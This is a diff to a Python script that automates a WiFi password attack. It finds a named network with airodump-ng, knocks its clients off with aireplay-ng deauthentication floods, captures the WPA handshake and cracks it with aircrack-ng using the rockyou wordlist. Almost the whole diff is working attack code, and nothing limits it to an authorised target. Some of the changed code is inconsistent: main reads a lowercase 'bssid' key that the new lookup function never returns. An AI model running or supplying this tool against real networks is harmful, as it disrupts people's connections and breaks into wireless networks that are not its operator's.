@@ -12,15 +12,28 @@ from typing import Optional
 import pty
 import select
 import sys
+import glob
 from typing import Optional, Dict, Any
+import csv
+
+def get_latest_output_file(basename: str) -> str | None:
+    pattern = f"{basename}-*.cap"
+    files = glob.glob(pattern)
+    if not files:
+        return None
+    # Sort files by creation time (newest last)
+    latest_file = max(files, key=os.path.getctime)
+    return latest_file
 
 def run_aircrack(capfile: str):
     logging.info("running aircrack-ng")
 
+    full_capfile_name = get_latest_output_file(capfile)
+
     # TODO: make the word list item default to rockyou.txt but also have it be a command arg
-    cmd = ["sudo", "aircrack-ng", capfile, "-w", "/usr/share/wordlists/rockyou.txt"]
+    cmd = ["sudo", "aircrack-ng", full_capfile_name, "-w", "/usr/share/wordlists/rockyou.txt"]
     
-    subprocess.run(cmd, capture_output=True, text=True)
+    return subprocess.run(cmd, capture_output=True, text=True)
 
 def put_interface_in_same_channel(iface: str, channel: str):
     logging.info("putting interface in channel %s", channel)
@@ -62,7 +75,7 @@ def send_deauths(aireplay_args, stop_event):
     proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     while not stop_event.is_set():
-        logging.info("sending deauth\n")
+        logging.info("sending deauth")
         if proc.poll() is not None:
             break  # command finished
         time.sleep(0.5)
@@ -91,96 +104,81 @@ def enable_monitor_mode(iface: str) -> str:
     cmd = ["sudo", "airmon-ng", "start", iface]
     logging.info("[*] Enabling monitor mode: %s", cmd)
     
-    result = subprocess.run(cmd, capture_output=True, text=True, check=True)
-    
-def find_network(
-    essid: str,
-    iface: str = "wlan0mon",
-    timeout: Optional[int] = None
-) -> Optional[Dict[str, Any]]:
-    """
-    Scan with airodump‑ng until *essid* appears and return its BSSID and channel.
-    Returns: {"bssid": "<mac>", "channel": <int>}  or  None if not found/timeout.
-    """
-    logging.info("looking for ESSID: %s", essid)
-    logging.info("interface: %s", iface)
-    
-    master_fd, slave_fd = pty.openpty()
-    proc = subprocess.Popen(
-        ["sudo", "airodump-ng", iface],
-        stdout=slave_fd,
-        stderr=subprocess.STDOUT,
-        text=False          # raw bytes – we’ll decode ourselves
-    )
-    os.close(slave_fd)
+    subprocess.run(cmd, capture_output=True, text=True, check=True)
 
-    buf = ""
-    start = time.time()
-    ch_col = None          # index of the “CH” column once we spot the header
+def clean_up_network_info(network_info: dict) -> dict:
+    for key in network_info:
+        network_info[key] = network_info[key].strip()
+    return network_info;
+
+def find_network_info_by_essid(essid: str, interface: str = "wlan0mon", timeout: int = 30) -> dict | None:
+    """
+    Runs airodump-ng on given interface, watches CSV output for a network matching the ESSID.
+    Returns all network info as a dict once found, or None on timeout.
+    """
+
+    output_prefix = "/tmp/airodump_capture"  # no .csv here
+    csv_path = Path(f"{output_prefix}-01.csv")
+    
+    # Start airodump-ng with CSV output
+    proc = subprocess.Popen(
+        ["sudo", "airodump-ng", interface, "--write", output_prefix, "--output-format", "csv"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
 
     try:
-        while proc.poll() is None:
-            if timeout and (time.time() - int(start)) > int(timeout):
-                logging.info("timeout reached – stopping scan.")
-                break
+        start_time = time.time()
 
-            ready, _, _ = select.select([master_fd], [], [], 0.5)
-            if not ready:
+        while time.time() - start_time < timeout:
+            if not csv_path.exists():
+                time.sleep(0.5)
                 continue
 
-            chunk = os.read(master_fd, 4096).decode(errors="replace")
-            buf += chunk
-            lines = buf.splitlines()
+            with open(csv_path, newline="", encoding="utf-8", errors="ignore") as csvfile:
+                reader = csv.reader(csvfile)
+                # airodump-ng CSV has a header, followed by data, then a blank line, then stations section
+                # We'll read until the blank line which indicates end of networks table
 
-            for line in lines:
-                # 1️⃣  Pin down the header once so we know where “CH” lives
-                if ch_col is None and "BSSID" in line and "ESSID" in line and "CH" in line:
-                    header = re.split(r"\s+", line.strip())
-                    try:
-                        ch_col = header.index("CH") + 1
-                    except ValueError:
-                        pass  # should not happen
-                    continue
-
-                # 2️⃣  Look for the target ESSID in each data row
-                if essid in line and ch_col is not None:
-                    parts = re.split(r"\s+", line.strip())
-
-                    # Guard against short/garbled rows
-                    if len(parts) <= ch_col:
+                for row in reader:
+                    if len(row) == 0:
+                        # blank line -> end of networks section
+                        continue
+                    # skip header row by checking for known header string or length
+                    if row[0] == "BSSID" or len(row) < 14:
                         continue
 
-                    bssid = parts[0]
-                    chan_str = parts[ch_col]
+                    # ESSID is typically last column
+                    row_essid = row[13].strip()
+                    if row_essid == essid:
+                        # Map header names to values (hardcoded columns per airodump-ng CSV format)
+                        keys = [
+                            "BSSID", "First time seen", "Last time seen", "channel", "Speed", "Privacy",
+                            "Cipher", "Authentication", "Power", "Beacons", "IV", "LAN IP", "ID-length", "ESSID", "Key"
+                        ]
 
-                    # Validate BSSID shape (aa:bb:cc:dd:ee:ff)
-                    if re.fullmatch(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
-                        # Channel can be ‘1’, ‘6’, ‘149’, etc.
-                        if chan_str.isdigit():
-                            channel = int(chan_str)
-                        else:                         # strip odd suffixes (e.g. “6e”)
-                            channel = int(re.sub(r"\D", "", chan_str) or -1)
+                        network_info = dict(zip(keys, row))
+                        network_info = clean_up_network_info(network_info)
+                        return network_info
 
-                        logging.info("Found %s ➜ BSSID: %s | channel: %s", essid, bssid, channel)
-                        # proc.terminate()
-                        # proc.wait()
-                        return {"bssid": bssid, "channel": channel}
+            time.sleep(0.5)
 
-            # keep buffer from ballooning
-            if len(buf) > 100_000:
-                buf = buf[-10_000:]
-
-    except KeyboardInterrupt:
-        logging.info("interrupted by user")
     finally:
+        proc.send_signal(signal.SIGINT)
         try:
-            proc.terminate()
-        except Exception:
-            pass
-        proc.wait()
-        os.close(master_fd)
+            proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            proc.kill()
 
-    logging.info("ESSID not found")
+        if csv_path.exists():
+            csv_path.unlink()  # clean up CSV file
+
+        # also remove other airodump-ng generated files if you want
+        for ext in ["-01.kismet.csv", "-01.kismet.netxml", "-01.kismet.wigle.xml"]:
+            f = Path(f"{output_prefix}{ext}")
+            if f.exists():
+                f.unlink()
+
     return None
 
 def main():
@@ -204,7 +202,9 @@ def main():
 
     kill_conflicting_processes()
     enable_monitor_mode(args.interface)
-    network_info = find_network(args.target, args.interface, "20")
+
+    network_info = find_network_info_by_essid(args.target, args.interface)
+    
     logging.info("Network Info: %s", network_info)
     
     if network_info:
@@ -212,22 +212,25 @@ def main():
         airodump_stop_event = threading.Event()
         
         # In its own thread, send 20 deauths by default TODO: make this value a command line arg
-        aireplay_args = { "interface": args.interface, "bssid": network_info["bssid"], "deauths": "20" }
+        aireplay_args = { "interface": args.interface, "bssid": network_info["bssid"], "deauths": "60" }
         # In second thread, capture the automatic reauthentication attempt
         airodump_args = { "cap_file_name": args.capfile, "channel": network_info["channel"], "bssid": network_info["bssid"], "interface": args.interface }
 
         deauth_thread = threading.Thread(target=send_deauths, args=(aireplay_args, aireplay_stop_event))
         airodump_thread = threading.Thread(target=start_airodump, args=(airodump_args, airodump_stop_event))
 
-        deauth_thread.start()
         airodump_thread.start()
+        deauth_thread.start()
 
-        time.sleep(10)
+        time.sleep(30)
         aireplay_stop_event.set()
         airodump_stop_event.set()
 
         deauth_thread.join()
         airodump_thread.join()
+
+        output = run_aircrack(args.capfile)
+        logging.info(output)
 
         logging.info("program complete")
 
